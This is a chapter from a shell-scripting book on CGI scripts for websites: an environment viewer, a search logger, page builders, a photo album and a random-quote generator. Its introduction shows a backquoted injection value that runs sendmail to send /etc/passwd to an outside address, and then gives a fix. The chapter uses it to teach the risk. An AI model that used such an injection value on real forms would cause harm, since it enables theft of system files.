<html><head></head><body>
<h2 class="h2" id="ch08"><span epub:type="pagebreak" id="page_199"/><span class="big"><strong>8</strong></span><br/><strong>WEBMASTER HACKS</strong></h2>&#13;
<div class="imagec"><img src="../images/common4.jpg" alt="image"/></div>&#13;
<p class="noindent">In addition to offering a great environment for building nifty command line tools that work with various websites, shell scripts can change the way your own site works. You can use shell scripts to write simple debugging tools, create web pages on demand, or even build a photo album browser that automatically incorporates new images uploaded to the server.</p>&#13;
<p class="indent">The scripts in this chapter are all <em>Common Gateway Interface (CGI)</em> scripts, generating dynamic web pages. As you write CGI scripts, you should always be conscious of possible security risks. One of the most common hacks that can catch a web developer unawares is an attacker accessing and exploiting the command line via a vulnerable CGI or other web language script.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_200"/>Consider the seemingly benign example of a web form that collects a user’s email address shown in <a href="ch08.xhtml#ch8ex1">Listing 8-1</a>. The script to process the form stores the user’s information in a local database and emails an acknowledgment.</p>&#13;
<pre class="programs">( echo "Subject: Thanks for your signup"&#13;
  echo "To: $email ($name)"&#13;
  echo ""&#13;
  echo "Thanks for signing up. You'll hear from us shortly."&#13;
  echo "-- Dave and Brandon"&#13;
) | sendmail $email</pre>&#13;
<p class="listcap"><a id="ch8ex1"/><em>Listing 8-1: Sending an email to a web form user’s address</em></p>&#13;
<p class="indent">Seems innocent, doesn’t it? Now imagine what would happen if, instead of a normal email address like <em><a href="mailto:taylor@intuitive.com">taylor@intuitive.com</a></em>, the user entered something like this:</p>&#13;
<pre class="programs">`sendmail d00d37@das-hak.de &lt; /etc/passwd; echo  taylor@intuitive.com`</pre>&#13;
<p class="indent">Can you see the danger lurking in that? Rather than just sending the short email to the address, this sends a copy of your <em>/etc/passwd</em> file to a delinquent at <em><a href="mailto:@das-hak.de">@das-hak.de</a></em>, perhaps to be used as the basis of a determined attack on your system security.</p>&#13;
<p class="indent">As a result, many CGI scripts are written in more security-conscious environments—notably <code>-w</code>-enabled Perl in the shebang (the <code>!#</code> at the top of shell scripts) so the script fails if data is used from an external source without being scrubbed or checked.</p>&#13;
<p class="indent">But a shell script’s lack of security features doesn’t preclude its being an equal partner in the world of web security. It just means you need to be conscious of where problems might creep in and eliminate them. For example, a tiny change in <a href="ch08.xhtml#ch8ex1">Listing 8-1</a> would prevent potential hooligans from providing bad external data, as shown in <a href="ch08.xhtml#ch8ex2">Listing 8-2</a>.</p>&#13;
<pre class="programs">( echo "Subject: Thanks for your signup"&#13;
  echo "To: $email ($name)"&#13;
  echo ""&#13;
  echo "Thanks for signing up. You'll hear from us shortly."&#13;
  echo "-- Dave and Brandon"&#13;
) | sendmail -t</pre>&#13;
<p class="listcap"><a id="ch8ex2"/><em>Listing 8-2: Sending an email using</em> <code><em>-t</em></code></p>&#13;
<p class="indent">The <code>-t</code> flag to <code>sendmail</code> tells the program to scan the message itself for a valid destination email address. The backquoted material never sees the light <span epub:type="pagebreak" id="page_201"/>of a command line, as it’s interpreted as an invalid email address within the <code>sendmail</code> queuing system. It safely ends up as a file in your home directory called <em>dead.message</em> and is dutifully logged in a system error file.</p>&#13;
<p class="indent">Another safety measure would be to encode information sent from the web browser to the server. An encoded backquote, for example, would actually be sent to the server (and handed off to the CGI script) as <code>%60</code>, which can certainly be handled by a shell script without danger.</p>&#13;
<p class="indent">One common characteristic of all the CGI scripts in this chapter is that they do very, very limited decoding of the encoded strings: spaces are encoded with a <code>+</code> for transmission, so translating them back to spaces is safe. The <code>@</code> character in email addresses is sent as <code>%40</code>, so that’s safely transformed back, too. Other than that, the scrubbed string can harmlessly be scanned for the presence of a <code>%</code> and generate an error if encountered.</p>&#13;
<p class="indent">Ultimately, sophisticated websites will use more robust tools than the shell, but as with many of the solutions in this book, a 20- to 30-line shell script can often be enough to validate an idea, prove a concept, or solve a problem in a fast, portable, and reasonably efficient manner.</p>&#13;
<h3 class="h3" id="ch08lev1sec01"><strong>Running the Scripts in This Chapter</strong></h3>&#13;
<p class="noindenta">To run the CGI shell scripts in this chapter, we’ll need to do a bit more than just name the script appropriately and save it. We must also place the script in the proper location, as determined by the configuration of the web server running. To do that, we can install the Apache web server with the system’s package manager and set it up to run our new CGI scripts. Here’s how to do so with the <code>apt</code> package manager:</p>&#13;
<pre class="programs">$ <span class="codestrong">sudo apt-get install apache2</span>&#13;
$ <span class="codestrong">sudo a2enmod cgi</span>&#13;
$ <span class="codestrong">sudo service apache2 restart</span></pre>&#13;
<p class="indent">Installing via the <code>yum</code> package manager should be very similar.</p>&#13;
<pre class="programs"># <span class="codestrong">yum install httpd</span>&#13;
# <span class="codestrong">a2enmod cgi</span>&#13;
# <span class="codestrong">service httpd restart</span></pre>&#13;
<p class="indent">Once it’s installed and configured, you should be able to start developing our scripts in the default <em>cgi-bin</em> directory for your chosen operating system (<em>/usr/lib/cgi-bin/</em> for Ubuntu or Debian and <em>/var/www/cgi-bin/</em> on CentOS), and then view them in a web browser at <em>http://&lt;ip&gt;/cgi-bin/script.cgi</em>. If the scripts still show up in plaintext in your browser, ensure that they are executable with the command <code>chmod +x script.cgi</code>.</p>&#13;
<h3 class="h3" id="ch08lev1sec02"><span epub:type="pagebreak" id="page_202"/><strong>#63 Seeing the CGI Environment</strong></h3>&#13;
<p class="noindenta">While we were developing some of the scripts for this chapter, Apple released the latest version of its Safari web browser. Our immediate question was, “How does Safari identify itself within the <code>HTTP_USER_AGENT</code> string?” Finding the answer is simple for a CGI script written in the shell, as in <a href="ch08.xhtml#ch8ex3">Listing 8-3</a>.</p>&#13;
<h4 class="h4" id="ch08lev2sec01"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # showCGIenv--Displays the CGI runtime environment, as given to any&#13;
   #   CGI script on this system&#13;
&#13;
   echo "Content-type: text/html"&#13;
   echo ""&#13;
&#13;
   # Now the real information...&#13;
&#13;
   echo "&lt;html&gt;&lt;body bgcolor=\"white\"&gt;&lt;h2&gt;CGI Runtime Environment&lt;/h2&gt;"&#13;
   echo "&lt;pre&gt;"&#13;
<span class="ent">➊</span> env || printenv&#13;
   echo "&lt;/pre&gt;"&#13;
   echo "&lt;h3&gt;Input stream is:&lt;/h3&gt;"&#13;
   echo "&lt;pre&gt;"&#13;
   cat -&#13;
   echo "(end of input stream)&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><a id="ch8ex3"/><em>Listing 8-3: The</em> <code><em>showCGIenv</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec02"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">When a query comes from a web client to a web server, the query sequence includes a number of environment variables that the web server (Apache, in this instance) hands to the script or program specified (the CGI). This script displays this data by using the shell <code>env</code> command <span class="ent">➊</span>—to be maximally portable, it’ll use <code>printenv</code> if the <code>env</code> invocation fails, the purpose of the <code>||</code> notation—and the rest of the script is necessary wrapper information to have the results fed back through the web server to the remote browser.</p>&#13;
<h4 class="h4" id="ch08lev2sec03"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">To run the code you need to have the script executable located on your web server. (See “<a href="ch08.xhtml#ch08lev1sec01">Running the Scripts in This Chapter</a>” on <a href="ch08.xhtml#page_201">page 201</a> for more details.) Then simply request the saved <em>.cgi</em> file from within a web browser. The results are shown in <a href="ch08.xhtml#ch8fig1">Figure 8-1</a>.</p>&#13;
<div class="image"><span epub:type="pagebreak" id="page_203"/><img src="../images/f08-01.jpg" alt="image"/></div>&#13;
<p class="figcap"><a id="ch8fig1"/><em>Figure 8-1: The CGI runtime environment, from a shell script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec04"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">Knowing how Safari identifies itself through the <code>HTTP_USER_AGENT</code> variable is quite useful, as <a href="ch08.xhtml#ch8ex4">Listing 8-4</a> shows.</p>&#13;
<pre class="programs">HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1)&#13;
AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7</pre>&#13;
<p class="listcap"><a id="ch8ex4"/><em>Listing 8-4: The</em> <code><em>HTTP_USER_AGENT</em></code> <em>environment variable in the CGI script</em></p>&#13;
<p class="indent">So Safari version 601.2.7 is in the class of Mozilla 5.0 browsers, running on Intel on OS X 10.11.1 using the KHTML rendering engine. All that information, tucked into a single variable!</p>&#13;
<h3 class="h3" id="ch08lev1sec03"><strong>#64 Logging Web Events</strong></h3>&#13;
<p class="noindenta">A cool use of a shell-based CGI script is to log events by using a wrapper. Suppose that you’d like to have a DuckDuckGo search box on your web page. Rather than feed the queries directly to DuckDuckGo, you’d like to log them first to see if what visitors are searching for is related to the content on your site.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_204"/>First off, a bit of HTML and CGI is necessary. Input boxes on web pages are created with the HTML <code>&lt;form&gt;</code> tag, and when the form is submitted by clicking the form’s button, it sends the user input to a remote web page specified in the value of the form’s <code>action</code> attribute. The DuckDuckGo query box on any web page can be reduced to something like the following:</p>&#13;
<pre class="programs">&lt;form method="get" action=""&gt;&#13;
Search DuckDuckGo:&#13;
&lt;input type="text" name="q"&gt;&#13;
&lt;input type="submit" value="search"&gt;&#13;
&lt;/form&gt;</pre>&#13;
<p class="indent">Rather than hand the search pattern directly to DuckDuckGo, we want to feed it to a script on our own server, which will log the pattern and then redirect the query to the DuckDuckGo server. The form therefore changes in only one small regard: the <code>action</code> field becomes a local script rather than a direct call to DuckDuckGo:</p>&#13;
<pre class="programs">&lt;!-- Tweak action value if script is placed in /cgi-bin/ or other --&gt;&#13;
&lt;form method="get" action="log-duckduckgo-search.cgi"&gt;</pre>&#13;
<p class="indent">The <code>log-duckduckgo-search</code> CGI script is remarkably simple, as <a href="ch08.xhtml#ch8ex5">Listing 8-5</a> shows.</p>&#13;
<h4 class="h4" id="ch08lev2sec05"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">#!/bin/bash&#13;
&#13;
# log-duckduckgo-search--Given a search request, logs the pattern and then&#13;
#   feeds the entire sequence to the real DuckDuckGo search system&#13;
&#13;
# Make sure the directory path and file listed as logfile are writable by&#13;
#   the user that the web server is running as.&#13;
logfile="/var/www/wicked/scripts/searchlog.txt"&#13;
&#13;
if [ ! -f $logfile ] ; then&#13;
  touch $logfile&#13;
  chmod a+rw $logfile&#13;
fi&#13;
&#13;
if [ -w $logfile ] ; then&#13;
  echo "$(date): <span class="ent">➊</span>$QUERY_STRING" | sed 's/q=//g;s/+/ /g' &gt;&gt; $logfile&#13;
fi&#13;
&#13;
echo "Location: https://duckduckgo.com/html/?$QUERY_STRING"&#13;
echo ""&#13;
&#13;
exit 0</pre>&#13;
<p class="listcap"><a id="ch8ex5"/><em>Listing 8-5: The</em> <code><em>log-duckduckgo-search</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec06"><span epub:type="pagebreak" id="page_205"/><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">The most notable elements of the script have to do with how web servers and web clients communicate. The information entered into the search box is sent to the server as the variable <code>QUERY_STRING</code> <span class="ent">➊</span>, encoded by replacing spaces with the <code>+</code> sign and other non-alphanumeric characters with the appropriate character sequences. Then, when the search pattern is logged, all <code>+</code> signs are translated back into spaces safely and simply. Otherwise the search pattern is not decoded, to protect against any tricky hacks a user might attempt. (See the introduction to this chapter for more details.)</p>&#13;
<p class="indent">Once logged, the web browser is redirected to the actual DuckDuckGo search page with the <code>Location:</code> header value. Notice that simply appending <code>?$QUERY_STRING</code> is sufficient to relay the search pattern to its final destination, however simple or complex the pattern may be.</p>&#13;
<p class="indent">The log file produced by this script prefaces each query string with the current date and time to build up a data file that not only shows popular searches but can also be analyzed by the time of day, the day of the week, the month, and so forth. There’s lots of information that this script could reveal about a busy site!</p>&#13;
<h4 class="h4" id="ch08lev2sec07"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">To really use this script, you need to create the HTML form, and you need to have the script executable and located on your server. (See “<a href="ch08.xhtml#ch08lev1sec01">Running the Scripts in This Chapter</a>” on <a href="ch08.xhtml#page_201">page 201</a> for more details.) However, we can test the script by using <code>curl</code>. To test the script, perform an HTTP request with <code>curl</code> that has a <code>q</code> parameter with the search query:</p>&#13;
<pre class="programs">$ <span class="codestrong">curl "10.37.129.5/cgi-bin/log-duckduckgo-search.cgi?q=metasploit"</span>&#13;
&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;&#13;
&lt;html&gt;&lt;head&gt;&#13;
&lt;title&gt;302 Found&lt;/title&gt;&#13;
&lt;/head&gt;&lt;body&gt;&#13;
&lt;h1&gt;Found&lt;/h1&gt;&#13;
&lt;p&gt;The document has moved &lt;a href="https://duckduckgo.com/&#13;
html/?q=metasploit"&gt;here&lt;/a&gt;.&lt;/p&gt;&#13;
&lt;hr&gt;&#13;
&lt;address&gt;Apache/2.4.7 (Ubuntu) Server at 10.37.129.5 Port 80&lt;/address&gt;&#13;
&lt;/body&gt;&lt;/html&gt;&#13;
$</pre>&#13;
<p class="indent">Then, verify that the search was logged by printing the contents of our search log to the console screen:</p>&#13;
<pre class="programs">$ <span class="codestrong">cat searchlog.txt</span>&#13;
Thu Mar 9 17:20:56 CST 2017: metasploit&#13;
$</pre>&#13;
<h4 class="h4" id="ch08lev2sec08"><span epub:type="pagebreak" id="page_206"/><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">Opening the script in a web browser, the results are from DuckDuckGo, exactly as expected, as shown in <a href="ch08.xhtml#ch8fig2">Figure 8-2</a>.</p>&#13;
<div class="image"><img src="../images/f08-02.jpg" alt="image"/></div>&#13;
<p class="figcap"><a id="ch8fig2"/><em>Figure 8-2: DuckDuckGo search results appear, but the search was logged!</em></p>&#13;
<p class="indent">On a busy website, you will doubtless find that monitoring searches with the command <code>tail -f searchlog.txt</code> is quite informative, as you learn what people seek online.</p>&#13;
<h4 class="h4" id="ch08lev2sec09"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">If the search box is used on every page of the website, then it would be useful to know what page the user was on when they performed the search. This could lead to good insights about whether particular pages explain themselves well enough. For instance, do users always search for more clarification on a topic from a given page? Logging the extra information about which page the user is searching from like the <code>Referer</code> HTTP header would be a great addition to the script.</p>&#13;
<h3 class="h3" id="ch08lev1sec04"><span epub:type="pagebreak" id="page_207"/><strong>#65 Building Web Pages on the Fly</strong></h3>&#13;
<p class="noindenta">Many websites have graphics and other elements that change on a daily basis. Web comics like Bill Holbrook’s <em>Kevin &amp; Kell</em> are a good example of this. On his site, the home page always features the most recent strip, and it turns out that the image-naming convention the site uses for individual comics is easy to reverse engineer, allowing you to include the cartoon on your own page, as <a href="ch08.xhtml#ch8ex6">Listing 8-6</a> details.</p>&#13;
<div class="note">&#13;
<p class="notet"><span class="noteg"><strong>WARNING</strong></span></p>&#13;
<p class="notep"><em>A Word from Our Lawyers: there are a lot of copyright issues to consider when scraping the content off another website for your own. For this example, we received explicit permission from Bill Holbrook to include his comic strip in this book. We encourage you to get permission to reproduce any copyrighted materials on your own site before you dig yourself into a deep hole surrounded by lawyers.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch08lev2sec10"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">#!/bin/bash&#13;
&#13;
# kevin-and-kell--Builds a web page on the fly to display the latest&#13;
#   strip from the cartoon "Kevin and Kell" by Bill Holbrook.&#13;
#   &lt;Strip referenced with permission of the cartoonist&gt;&#13;
&#13;
month="$(date +%m)"&#13;
  day="$(date +%d)"&#13;
 year="$(date +%y)"&#13;
&#13;
echo "Content-type: text/html"&#13;
echo ""&#13;
&#13;
echo "&lt;html&gt;&lt;body bgcolor=white&gt;&lt;center&gt;"&#13;
echo "&lt;table border=\"0\" cellpadding=\"2\" cellspacing=\"1\"&gt;"&#13;
echo "&lt;tr bgcolor=\"#000099\"&gt;"&#13;
echo "&lt;th&gt;&lt;font color=white&gt;Bill Holbrook's Kevin &amp;amp; Kell&lt;/font&gt;&lt;/th&gt;&lt;/tr&gt;"&#13;
echo "&lt;tr&gt;&lt;td&gt;&lt;img "&#13;
&#13;
# Typical URL: http://www.kevinandkell.com/2016/strips/kk20160804.jpg&#13;
&#13;
/bin/echo -n " src=\"http://www.kevinandkell.com/20${year}/"&#13;
echo "strips/kk20${year}${month}${day}.jpg\"&gt;"&#13;
echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;"&#13;
echo "&amp;copy; Bill Holbrook. Please see "&#13;
echo "&lt;a href=\"http://www.kevinandkell.com/\"&gt;kevinandkell.com&lt;/a&gt;"&#13;
echo "for more strips, books, etc."&#13;
echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;"&#13;
&#13;
exit 0</pre>&#13;
<p class="listcap"><a id="ch8ex6"/><em>Listing 8-6: The</em> <code><em>kevin-and-kell</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec11"><span epub:type="pagebreak" id="page_208"/><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">A quick View Source of the home page for <em>Kevin &amp; Kell</em> reveals that the URL for a given comic is built from the current year, month, and day, as shown here:</p>&#13;
<pre class="programs">http://www.kevinandkell.com/2016/strips/kk20160804.jpg</pre>&#13;
<p class="indent">To build a page that includes this strip on the fly, the script needs to ascertain the current year (as a two-digit value), month, and day (both with a leading zero, if needed). The rest of the script is just HTML wrapper to make the page look nice. In fact, this is a remarkably simple script, given the resultant functionality.</p>&#13;
<h4 class="h4" id="ch08lev2sec12"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">Like the other CGI scripts in this chapter, this script must be placed in an appropriate directory so that it can be accessed via the web, with the appropriate file permissions. Then it’s just a matter of invoking the proper URL from a browser.</p>&#13;
<h4 class="h4" id="ch08lev2sec13"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">The web page changes every day, automatically. For the strip of August 4, 2016, the resulting page is shown in <a href="ch08.xhtml#ch8fig3">Figure 8-3</a>.</p>&#13;
<div class="image"><img src="../images/f08-03.jpg" alt="image"/></div>&#13;
<p class="figcap"><a id="ch8fig3"/><em>Figure 8-3: The</em> Kevin &amp; Kell <em>web page, built on the fly</em></p>&#13;
<h4 class="h4" id="ch08lev2sec14"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">This concept can be applied to almost anything on the web if you’re so inspired. You could scrape the headlines from CNN or the <em>South China Morning Post</em>, or get a random advertisement from a cluttered site. Again, if you’re going to make the content an integral part of your site, make sure that it’s public domain or that you’ve arranged for permission.</p>&#13;
<h3 class="h3" id="ch08lev1sec05"><span epub:type="pagebreak" id="page_209"/><strong>#66 Turning Web Pages into Email Messages</strong></h3>&#13;
<p class="noindenta">By combining the method of reverse engineering file-naming conventions with the website-tracking utility shown in <a href="ch07.xhtml#ch07lev1sec10">Script #62</a> on <a href="ch07.xhtml#page_194">page 194</a>, you can email yourself a web page that updates not only its content but also its filename. This script does not require the use of a web server to be useful and can be run like the rest of the scripts we have written so far in the book. A word of caution, however: Gmail and other email providers may filter emails sent from a local Sendmail utility. If you do not receive the emails from the following script, try using a service like Mailinator (<em><a href="http://mailinator.com/">http://mailinator.com/</a></em>) for testing purposes.</p>&#13;
<h4 class="h4" id="ch08lev2sec15"><em><strong>The Code</strong></em></h4>&#13;
<p class="noindenta">As an example, we’ll use <em>The Straight Dope</em>, a witty column Cecil Adams writes for the <em>Chicago Reader.</em> It’s straightforward to have the new <em>Straight Dope</em> column automatically emailed to a specified address, as <a href="ch08.xhtml#ch8ex7">Listing 8-7</a> shows.</p>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # getdope--Grabs the latest column of "The Straight Dope."&#13;
   #   Set it up in cron to be run every day, if so inclined.&#13;
&#13;
   now="$(date +%y%m%d)"&#13;
   start="http://www.straightdope.com/ "&#13;
   to="testing@yourdomain.com"   # Change this as appropriate.&#13;
&#13;
   # First, get the URL of the current column.&#13;
&#13;
<span class="ent">➊</span> URL="$(curl -s "$start" | \&#13;
   grep -A1 'teaser' | sed -n '2p' | \&#13;
   cut -d\" -f2 | cut -d\" -f1)"&#13;
&#13;
   # Now, armed with that data, produce the email.&#13;
&#13;
   ( cat &lt;&lt; EOF&#13;
   Subject: The Straight Dope for $(date "+%A, %d %B, %Y")&#13;
   From: Cecil Adams &lt;dont@reply.com&gt;&#13;
   Content-type: text/html&#13;
   To: $to&#13;
&#13;
   EOF&#13;
&#13;
   curl "$URL"&#13;
   ) | /usr/sbin/sendmail -t&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><a id="ch8ex7"/><em>Listing 8-7: The</em> <code><em>getdope</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec16"><span epub:type="pagebreak" id="page_210"/><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">The page with the latest column has a URL that you need to extract from the home page, but examination of the source code reveals that each column is identified in the source with a <code>class"="teaser"</code> and that the most recent column is always first on the page. This means that the simple command sequence starting at <span class="ent">➊</span> should extract the URL of the latest column.</p>&#13;
<p class="indent">The <code>curl</code> command grabs the source to the home page, the <code>grep</code> command outputs each matching “teaser” line along with the line immediately after, and <code>sed</code> makes it easy to grab the second line of the resultant output so we can pull the latest article.</p>&#13;
<h4 class="h4" id="ch08lev2sec17"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">To extract just the URL, simply omit everything before the first double quote and everything after the resultant first quote. Test it on the command line, piece by piece, to see what each step accomplishes.</p>&#13;
<h4 class="h4" id="ch08lev2sec18"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">While succinct, this script demonstrates a sophisticated use of the web, extracting information from one web page to use as the basis of a subsequent invocation.</p>&#13;
<p class="indent">The resultant email therefore includes everything on the page, including menus, images, and all the footer and copyright information, as shown in <a href="ch08.xhtml#ch8fig4">Figure 8-4</a>.</p>&#13;
<div class="image"><img src="../images/f08-04.jpg" alt="image"/></div>&#13;
<p class="figcap"><a id="ch8fig4"/><em>Figure 8-4: Getting the latest</em> Straight Dope <em>article delivered straight to your inbox</em></p>&#13;
<h4 class="h4" id="ch08lev2sec19"><span epub:type="pagebreak" id="page_211"/><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">Sometimes you might want to sit down for an hour or two on the weekend and read the past week’s articles, rather than retrieve one email daily. These types of aggregate emails are generally called <em>email digests</em> and can be easier to go through in one sitting. A good hack would be to update the script to take the article for the last seven days and send them all in one email at the end of the week. It also cuts back on all those emails you get during the week!</p>&#13;
<h3 class="h3" id="ch08lev1sec06"><strong>#67 Creating a Web-Based Photo Album</strong></h3>&#13;
<p class="noindenta">CGI shell scripts aren’t limited to working with text. A common use of websites is as a photo album that allows you to upload lots of pictures and has some sort of software to help organize everything and make it easy to browse. Surprisingly, a basic “proof sheet” of photos in a directory is quite easy to produce with a shell script. The script shown in <a href="ch08.xhtml#ch8ex8">Listing 8-8</a> is only 44 lines.</p>&#13;
<h4 class="h4" id="ch08lev2sec20"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
   # album--Online photo album script&#13;
   echo "Content-type: text/html"&#13;
   echo ""&#13;
&#13;
   header="header.html"&#13;
   footer="footer.html"&#13;
    count=0&#13;
&#13;
   if [ -f $header ] ; then&#13;
     cat $header&#13;
   else&#13;
     echo "&lt;html&gt;&lt;body bgcolor='white' link='#666666' vlink='#999999'&gt;&lt;center&gt;"&#13;
   fi&#13;
&#13;
   echo "&lt;table cellpadding='3' cellspacing='5'&gt;"&#13;
&#13;
<span class="ent">➊</span> for name in $(file /var/www/html/* | grep image | cut -d: -f1)&#13;
   do&#13;
     name=$(basename $name)&#13;
     if [ $count -eq 4 ] ; then&#13;
       echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align='center'&gt;"&#13;
       count=1&#13;
     else&#13;
       echo "&lt;/td&gt;&lt;td align='center'&gt;"&#13;
       count=$(( $count + 1 ))&#13;
     fi&#13;
&#13;
<span class="ent">➋</span>   nicename="$(echo $name | sed 's/.jpg//;s/-/ /g')"&#13;
&#13;
     echo "&lt;a href='../$name' target=_new&gt;&lt;img style='padding:2px'"&#13;
     echo "src='../$name' height='200' width='200' border='1'&gt;&lt;/a&gt;&lt;BR&gt;"&#13;
     echo "&lt;span style='font-size: 80%'&gt;$nicename&lt;/span&gt;"&#13;
   done&#13;
&#13;
   echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"&#13;
&#13;
   if [ -f $footer ] ; then&#13;
     cat $footer&#13;
   else&#13;
     echo "&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;"&#13;
   fi&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_212"/><a id="ch8ex8"/><em>Listing 8-8: The</em> <code><em>album</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec21"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">Almost all of the code here is HTML to create an attractive output format. Take out the <code>echo</code> statements, and there’s a simple <code>for</code> loop that iterates through each file in the <em>/var/www/html</em> directory <span class="ent">➊</span> (which is the default web root on Ubuntu 14.04), identifying the files that are images through use of the <code>file</code> command.</p>&#13;
<p class="indent">This script works best with a file-naming convention in which every filename has dashes where it would otherwise have spaces. For example, the <code>name</code> value of <em>sunset-at-home.jpg</em> is transformed into the <code>nicename</code> <span class="ent">➋</span> of <em>sunset at home</em>. It’s a simple transformation, but one that allows each picture in the album to have an attractive, human-readable name rather than something unsightly like <em>DSC00035.JPG</em>.</p>&#13;
<h4 class="h4" id="ch08lev2sec22"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">To run this script, drop it into a directory full of JPEG images, naming the script <em>index.cgi</em>. If your web server is configured properly, requesting to view that directory automatically invokes <em>index.cgi</em>, as long as no <em>index.html</em> file is present. Now you have an instant, dynamic photo album.</p>&#13;
<h4 class="h4" id="ch08lev2sec23"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">Given a directory of landscape shots, the results are quite pleasing, as shown in <a href="ch08.xhtml#ch8fig5">Figure 8-5</a>. Notice that <em>header.html</em> and <em>footer.html</em> files are present in the same directory, so they are automatically included in the output too.</p>&#13;
<div class="image"><span epub:type="pagebreak" id="page_213"/><img src="../images/f08-05.jpg" alt="image"/></div>&#13;
<p class="figcap"><a id="ch8fig5"/><em>Figure 8-5: An instant online photo album created with 44 lines of shell script!</em></p>&#13;
<h4 class="h4" id="ch08lev2sec24"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">One limitation of this script is that the full-size version of each picture must be downloaded for the photo album view to be shown. If you have a dozen 100MB picture files, that could take quite a while for someone on a slow connection. The thumbnails aren’t really any smaller. The solution is to automatically create scaled versions of each image, which can be done within a script by using a tool like ImageMagick (see <a href="ch14.xhtml#ch14lev1sec04">Script #97</a> on <a href="ch14.xhtml#page_322">page 322</a>). Unfortunately, very few Unix installations include sophisticated graphics tools of this nature, so if you’d like to extend this photo album in that direction, start by learning more about the ImageMagick tool at <em><a href="http://www.imagemagick.org/">http://www.imagemagick.org/</a></em>.</p>&#13;
<p class="indent">Another way to extend this script would be to teach it to show a clickable folder icon for any subdirectories so that the album acts as an entire file system or tree of photographs, organized into portfolios.</p>&#13;
<p class="indent">This photo album script is a longtime favorite. What’s delightful about having this as a shell script is that it’s incredibly easy to extend the functionality in any of a thousand ways. For example, by using a script called <code>showpic</code> to display the larger images rather than just linking to the JPEG images, it would take about 15 minutes to implement a per-image counter system so that people could see which images were most popular.</p>&#13;
<h3 class="h3" id="ch08lev1sec07"><strong>#68 Displaying Random Text</strong></h3>&#13;
<p class="noindenta">A lot of web servers offer built-in <em>server-side include (SSI)</em> capability, which allows you to invoke a program to add one or more lines of text to a web page as it’s being served to the visitor. This offers some wonderful ways to extend <span epub:type="pagebreak" id="page_214"/>your web pages. One of our favorites is the ability to change an element of a web page each time the page is loaded. The element might be a graphic, a news snippet, a featured subpage, or a tagline for the site itself that’s slightly different on each visit, to keep the reader coming back for more.</p>&#13;
<p class="indent">What’s remarkable is that this trick is quite easy to accomplish with a shell script containing an <code>awk</code> program only a few lines long, invoked from within a web page via a SSI or an <em>iframe</em> (a way to have a portion of a page served up by a URL that’s different from the rest of the page). The script is shown in <a href="ch08.xhtml#ch8ex9">Listing 8-9</a>.</p>&#13;
<h4 class="h4" id="ch08lev2sec25"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">#!/bin/bash&#13;
&#13;
# randomquote--Given a one-line-per-entry datafile,&#13;
#   randomly picks one line and displays it. Best used&#13;
#   as an SSI call within a web page.&#13;
&#13;
awkscript="/tmp/randomquote.awk.$$"&#13;
&#13;
if [ $# -ne 1 ] ; then&#13;
  echo "Usage: randomquote datafilename" &gt;&amp;2&#13;
  exit 1&#13;
elif [ ! -r "$1" ] ; then&#13;
  echo "Error: quote file $1 is missing or not readable" &gt;&amp;2&#13;
  exit 1&#13;
fi&#13;
&#13;
trap "$(which rm) -f $awkscript" 0&#13;
&#13;
cat &lt;&lt; "EOF" &gt; $awkscript&#13;
BEGIN { srand() }&#13;
      { s[NR] = $0 }&#13;
END   { print s[randint(NR)] }&#13;
function randint(n) { return int (n * rand() ) + 1 }&#13;
EOF&#13;
&#13;
awk -f $awkscript &lt; "$1"&#13;
&#13;
exit 0</pre>&#13;
<p class="listcap"><a id="ch8ex9"/><em>Listing 8-9: The</em> <code><em>randomquote</em></code> <em>script</em></p>&#13;
